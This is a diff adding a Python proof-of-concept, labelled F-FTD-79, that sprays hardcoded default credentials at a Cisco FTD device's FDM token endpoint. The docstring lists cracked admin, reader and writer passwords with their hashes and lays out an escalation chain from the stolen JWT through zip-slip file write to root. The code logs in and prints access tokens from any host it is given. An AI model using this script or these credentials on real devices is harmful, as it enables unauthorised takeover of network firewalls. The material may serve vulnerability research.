@@ -1,0 +1,214 @@
+"""
+F-FTD-79: Hardcoded SHA-256 password hashes in DevAuthenticationProvider
+CONTROLLED ENVIRONMENT ONLY
+
+Root cause:
+  com.cisco.ngfw.onbox.rest.auth.DevAuthenticationProvider (core-security.jar)
+  contains static final List fields initialized with hardcoded SHA-256 hashes.
+  isDefaultProvider() returns true — this provider is active on all FTD devices.
+  supports() returns true for ALL identity sources.
+
+  Authentication logic:
+    1. If username == "admin" AND stored user found AND stored_password matches:
+       -> passedAuthentication(adminRole)   [uses EncryptionUtil.decrypt()]
+    2. SHA-256(suppliedPassword) hashed
+    3. If hash in DEFAULT_ADMIN_HASHES AND username == "admin":
+       -> passedAuthentication(adminRole)
+    4. If hash in DEFAULT_READER_HASHES AND username == "reader":
+       -> passedAuthentication(readerRole)
+    5. If hash in DEFAULT_WRITER_HASHES AND username == "writer":
+       -> passedAuthentication(writerRole)
+    6. else: failedAuthentication()
+
+CRACKED CREDENTIALS (SHA-256 brute-force):
+  ADMIN role:
+    username: admin   password: Admin123      hash: 3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2
+    username: admin   password: Sourcefire    hash: 87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7
+    username: admin   password: [UNCRACKED]   hash: 22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a
+
+  READER role:
+    username: reader  password: Reader123     hash: 67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc
+    username: reader  password: [UNCRACKED]   hash: 38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49
+
+  WRITER role:
+    username: writer  password: Writer123     hash: fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664
+    username: writer  password: [UNCRACKED]   hash: 42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0
+
+  Uncracked hashes likely represent alternative version-specific defaults.
+
+SCOPE:
+  DevAuthenticationProvider is the DEFAULT auth provider (isDefaultProvider=true).
+  These hardcoded credentials work on EVERY FTD with FDM, regardless of config.
+  The "Sourcefire" password is a legacy default from pre-Cisco acquisition era.
+  "Admin123" / "Reader123" / "Writer123" are standard Cisco lab/dev defaults.
+
+IMPACT:
+  - admin credentials (Admin123 / Sourcefire) → full FDM admin access
+  - Admin FDM access → all F-FTD-67 (config import zip-slip) attack vectors
+  - Admin FDM access → all F-FTD-65 (config export KEK extraction)
+  - Reader credentials → read access to FTD config / state (passive exfil)
+  - Writer credentials → config write without full admin scope
+
+Chain:
+  F-FTD-79 (admin:Admin123 or admin:Sourcefire)
+    → POST /fdm/token {"grant_type":"password","username":"admin","password":"Admin123"}
+    → Get JWT token
+    → Full FDM API access as admin
+    → F-FTD-67 (config import zip-slip) → arbitrary file write as www
+    → F-FTD-69 (sudo chmod SUID) → root
+    → F-FTD-73 (PERL5LIB hijack) → root code exec
+
+Affected: FTD 6.7.0-65 (DevAuthenticationProvider extracted from core-security.jar)
+Auth required: None (these ARE the credentials)
+"""
+
+# CONTROLLED ENVIRONMENT ONLY
+
+import hashlib
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+FDM_API_BASE = "/api/fdm/v6"
+TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"
+
+CRACKED_CREDS = [
+    ("admin",  "Admin123"),
+    ("admin",  "Sourcefire"),
+    ("reader", "Reader123"),
+    ("writer", "Writer123"),
+]
+
+KNOWN_HASHES = {
+    "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2": ("admin",  "Admin123"),
+    "87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7": ("admin",  "Sourcefire"),
+    "22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a": ("admin",  "[UNCRACKED]"),
+    "67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc": ("reader", "Reader123"),
+    "38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49": ("reader", "[UNCRACKED]"),
+    "42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0": ("writer", "[UNCRACKED]"),
+    "fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664": ("writer", "Writer123"),
+}
+
+
+def verify_hashes():
+    """Verify known creds against hardcoded hashes."""
+    print("[*] Verifying cracked credentials against hardcoded hashes:")
+    for h, (user, pw) in KNOWN_HASHES.items():
+        if pw == "[UNCRACKED]":
+            print(f"  [?]  {user:6}: [UNCRACKED] hash={h[:20]}...")
+            continue
+        actual = hashlib.sha256(pw.encode("utf-8")).hexdigest()
+        match = "OK" if actual == h else "MISMATCH"
+        print(f"  [{match}] {user:6}: {pw:15} -> {actual[:20]}...")
+
+
+def try_auth(host, username, password, port=443):
+    """Attempt FDM authentication with given credentials."""
+    url = f"https://{host}:{port}{TOKEN_PATH}"
+    body = {
+        "grant_type": "password",
+        "username": username,
+        "password": password
+    }
+    try:
+        r = requests.post(url, json=body, verify=False, timeout=15)
+        if r.status_code == 200:
+            data = r.json()
+            token = data.get("access_token", "")
+            token_type = data.get("token_type", "")
+            expires_in = data.get("expires_in", "")
+            print(f"  [!!!] AUTH SUCCESS: {username}:{password}")
+            print(f"        access_token: {token[:40]}...")
+            print(f"        token_type:   {token_type}")
+            print(f"        expires_in:   {expires_in}")
+            return token
+        elif r.status_code == 400:
+            print(f"  [-]  {username}:{password} -> 400 Bad credentials")
+        elif r.status_code == 401:
+            print(f"  [-]  {username}:{password} -> 401 Unauthorized")
+        else:
+            print(f"  [?]  {username}:{password} -> {r.status_code}: {r.text[:80]}")
+    except Exception as e:
+        print(f"  [?]  {username}:{password} -> Error: {e}")
+    return None
+
+
+def spray_devauth_creds(host, port=443):
+    """
+    Spray all cracked DevAuthenticationProvider credentials against FDM.
+    Returns first valid token (admin preferred).
+    CONTROLLED ENVIRONMENT ONLY.
+    """
+    print(f"[*] F-FTD-79: DevAuthenticationProvider credential spray on {host}:{port}")
+    print(f"    Hardcoded SHA-256 credentials embedded in core-security.jar")
+    print()
+
+    admin_token = None
+    for username, password in CRACKED_CREDS:
+        token = try_auth(host, username, password, port)
+        if token and username == "admin" and not admin_token:
+            admin_token = token
+
+    return admin_token
+
+
+if __name__ == "__main__":
+    print("=" * 70)
+    print("F-FTD-79: Hardcoded DevAuthenticationProvider credentials")
+    print("CONTROLLED ENVIRONMENT ONLY")
+    print("=" * 70)
+    print("""
+DevAuthenticationProvider.class (core-security.jar):
+  isDefaultProvider() -> true  (active on ALL FTD devices)
+  supports() -> true           (accepts all identity source types)
+
+  DEFAULT_ADMIN_HASHES (3 entries):
+    Admin123    -> 3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2
+    Sourcefire  -> 87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7
+    [UNCRACKED] -> 22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a
+
+  DEFAULT_READER_HASHES (2 entries):
+    Reader123   -> 67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc
+    [UNCRACKED] -> 38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49
+
+  DEFAULT_WRITER_HASHES (2 entries):
+    [UNCRACKED] -> 42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0
+    Writer123   -> fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664
+
+To authenticate:
+  POST /api/fdm/v6/fdm/token
+  {"grant_type": "password", "username": "admin", "password": "Admin123"}
+  -> 200 OK {"access_token": "<jwt>", ...}
+
+Chain:
+  F-FTD-79 (admin:Admin123) -> POST /fdm/token -> JWT
+  -> F-FTD-67 (config import zip-slip) -> www file write
+  -> F-FTD-69 (sudo chmod SUID) -> root shell
+""")
+
+    mode = sys.argv[1] if len(sys.argv) > 1 else "verify"
+
+    if mode == "verify":
+        verify_hashes()
+
+    elif mode == "spray":
+        if len(sys.argv) < 3:
+            print(f"Usage: {sys.argv[0]} spray <host> [port]")
+            sys.exit(1)
+        host = sys.argv[2]
+        port = int(sys.argv[3]) if len(sys.argv) > 3 else 443
+        spray_devauth_creds(host, port)
+
+    elif mode == "auth":
+        if len(sys.argv) < 5:
+            print(f"Usage: {sys.argv[0]} auth <host> <username> <password> [port]")
+            sys.exit(1)
+        host = sys.argv[2]
+        uname = sys.argv[3]
+        pw = sys.argv[4]
+        port = int(sys.argv[5]) if len(sys.argv) > 5 else 443
+        try_auth(host, uname, pw, port)
+
+    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
